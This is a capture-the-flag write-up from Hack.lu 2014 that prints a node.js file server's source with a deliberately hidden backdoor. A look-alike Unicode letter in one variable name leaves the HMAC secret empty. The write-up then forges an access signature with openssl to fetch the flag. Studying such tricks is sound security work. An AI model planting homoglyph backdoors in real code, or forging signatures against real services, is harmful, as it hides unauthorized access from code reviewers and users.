---
layout: post
title: "Hack.lu 2014 - Hidden in ρlaιn sιght"
date: 2014-10-23 13:23
comments: true
author: darby
categories: unicode, stego
---

## Challenge

At our software development company, one of the top developers left in anger. He told us that he had hidden a backdoor in our node.js server application – he thinks that we can't find it even if we try. I have attached the source code of our fileserver. After registration, you can log in, upload files and create access tokens for your files that others can use to retrieve them. He must have added some way to retrieve files without permission. And we don't have version control, so we can't just check his last commits. We have read the source code multiple times, but just can't figure out how he did it. Maybe he just lied? Can you help us and demonstrate how the backdoor works? We have uploaded a file to "testuser/files/flag.txt" – please try to retrieve it. 

Connect to https://wildwildweb.fluxfingers.net:1409/. Note that all your files will be purged every 5 minutes. 

You can download the service code here: [Download](https://wildwildweb.fluxfingers.net/static/chals/hiddeninplainsight_7a1f79aab159ace6e4486dc73bd24cc8.js)


## Analysis

Downloading the code gives us:

```js
#!/usr/bin/env node

// npm install express@3.18.0

var fs = require('fs')
var crypto = require('crypto')
var express = require('express')
var app = express()
app.listen(1409)
app.use(require('express').bodyParser({uploadDir: __dirname+'/upload_tmp/'}))

var HMAC_SECRET = ''
for (var i=0; i<20; i++) {
  HMAC_SΕCRET = HMAC_SECRET + (Math.random()+'').substr(2)
}

function hmac_sign(path) {
  var hmac = crypto.createHmac('sha256', HMAC_SECRET)
  hmac.update(path)
  return hmac.digest('hex')
}

app.get('/', function(req, res) {
  res.send('<!DOCTYPE html><html><head><title>docstore</title></head><body><ul>'
          +  '<li><a href="register">register</a></li>'
          +  '<li><a href="upload">upload a file</a></li>'
          +  '<li><a href="link">generate an access link</a></li>'
          +'</ul></body></html>')
})

function user_possible(user) {
  return /^[a-zA-Z]+$/.test(user)
}

function auth_ok(user, pass, cb) {
  if (!user_possible(user)) return cb(false)
  fs.readFile('users/'+user+'/pass', {encoding:'utf8'}, function(err, real_pass) {
    if (err) return cb(false) // e.g. if user doesn't exist
    cb(pass === real_pass)
  })
}

app.get('/register', function(req, res) {
  res.send('<!DOCTYPE html><html><head><title>register</title></head><body><form method="POST">'+
    'user: <input type="text" name="user"><br>pass: <input type="password" name="pass"><br><button type="submit">register</button>'+
    '</form></body></html>')
})

app.post('/register', function(req, res) {
  if (!req.body) return res.send('body missing? wtf?')
  var user = req.body.user, pass = req.body.pass;
  if (typeof user !== 'string' || typeof pass !== 'string') {
    return res.send('bad request')
  }

  if (!user_possible(user)) {
    return res.send('bad username')
  }

  var userdir = 'users/'+user+'/'
  fs.mkdir(userdir, function(err) {
    if (err) return res.send('unable to create user: '+e.code)
    fs.writeFile(userdir+'pass', pass, function(err) {
      if (err) throw err
      fs.mkdir(userdir+'files', function(err) {
        if (err) throw err
        res.redirect('/')
      })
    })
  })
})

app.get('/upload', function(req, res) {
  res.send('<!DOCTYPE html><html><head><title>upload</title></head><body><form method="POST" enctype="multipart/form-data">'+
    'user: <input type="text" name="user"><br>pass: <input type="password" name="pass"><br><input type="file" name="file"><br><button type="submit">upload</button>'+
    '</form></body></html>')
})

function sanitize_filename(f) {
  f = f.replace(/[^a-zA-Z0-9_.-]/g, '')
  if (f.length == 0 || f[0] == '.') f = '_'+f
  return f
}

app.post('/upload', function(req, res) {
  if (!req.body) return res.send('body missing? wtf?')
  var user = req.body.user, pass = req.body.pass, file = req.files.file;
  if (typeof user !== 'string' || typeof pass !== 'string' || typeof file !== 'object') {
    return res.send('bad request')
  }

  auth_ok(user, pass, function(is_ok) {
    if (!is_ok) return res.send('bad auth')
    var filename = sanitize_filename(file.name)
    fs.rename(file.path, 'users/'+user+'/files/'+filename, function(err) {
      if (err) return res.send('error: unable to rename')
      res.send('file was stored with name '+filename)
    })
  })
})

app.get('/link', function(req, res) {
  res.send('<!DOCTYPE html><html><head><title>generate a link</title></head><body><form method="POST" enctype="multipart/form-data">'+
    'user: <input type="text" name="user"><br>pass: <input type="password" name="pass"><br>file: <input type="text" name="file"><br><button type="submit">generate link</button>'+
    '</form></body></html>')
})

app.post('/link', function(req, res) {
  if (!req.body) return res.send('body missing? wtf?')
  var user = req.body.user, pass = req.body.pass, file = req.body.file;
  if (typeof user !== 'string' || typeof pass !== 'string' || typeof file !== 'string') {
    return res.send('bad request')
  }
  file = sanitize_filename(file)

  auth_ok(user, pass, function(is_ok) {
    if (!is_ok) return res.send('bad auth')
    file = file.replace(/[^a-zA-Z0-9_.-]/g, '')
    res.redirect('/files/'+user+'/'+file+'/'+hmac_sign(user+'/'+file))
  })
})

app.get('/files/:user/:file/:signature', function(req, res) {
  var user = req.params.user, file = req.params.file, signature = req.params.signature
  if (!user_possible(user)) return res.send('bad user')
  if (sanitize_filename(file) !== file) return res.send('bad filename')
  if (hmac_sign(user+'/'+file) !== signature) return res.send('bad signature')
  res.set('Content-Type', 'text/plain')
  res.sendfile('users/'+user+'/files/'+file)
})
```

## Analysis

The trick here is in the for loop where `HMAC_SECRET` is being updated, they
actually use unicode to hide the fact that a different variable gets updated.
So the actual secret is empty.

```
$ echo -n "testuser/flag.txt" | openssl dgst -sha256 -hmac ""
(stdin)= 4a332c7f27909f85a529393cea72301393f84cf5908aa2538137776f78624db4
$
```

So, the url is

```
https://wildwildweb.fluxfingers.net:1409/files/testuser/flag.txt/4a332c7f27909f85a529393cea72301393f84cf5908aa2538137776f78624db4
```
```
flag{unicode_stego_is_best_stego}
```
